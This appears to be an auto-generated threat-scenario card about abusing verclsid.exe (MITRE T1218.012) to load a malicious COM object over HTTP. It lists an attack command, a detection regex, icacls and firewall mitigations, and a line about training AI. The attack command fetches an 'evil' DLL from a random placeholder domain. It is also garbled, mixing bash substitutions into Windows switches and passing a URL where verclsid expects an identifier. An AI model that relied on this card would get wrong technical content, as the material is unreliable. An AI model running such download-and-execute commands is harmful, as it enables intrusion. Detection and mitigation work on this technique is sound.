---
type: campaign
scenario_id: 331
tactic: Defense Evasion
technique: "T1218.012: Verclsid"
technique_id: T1218.012
tags: [campaign, lotl, defense_evasion]
---

# Using verclsid.exe to execute malicious COM object via HTTP.

## Threat Description
Using verclsid.exe to execute malicious COM object via HTTP.

## Attack Command
```
verclsid /S /C {$(uuidgen)} /I http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)
```

## Detection Logic
Monitor verclsid HTTP: `wmic process where name='verclsid.exe' get commandline | findstr http`; YARA rule: `rule VerclsidHttpDll { strings: $a = /verclsid.*http/ nocase; condition: $a }`.

## Mitigation
Restrict verclsid: `icacls %windir%\System32\verclsid.exe /deny Everyone:RX`; Block COM downloads: `netsh advfirewall firewall add rule name='Block verclsid' dir=out program='%windir%\System32\verclsid.exe' action=block`.

## AI Training Prompt
Train AI to detect verclsid HTTP COM execution and suggest firewall rules.

## References
- MITRE ATT&CK T1218.012: https://attack.mitre.org/techniques/T1218/012/
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
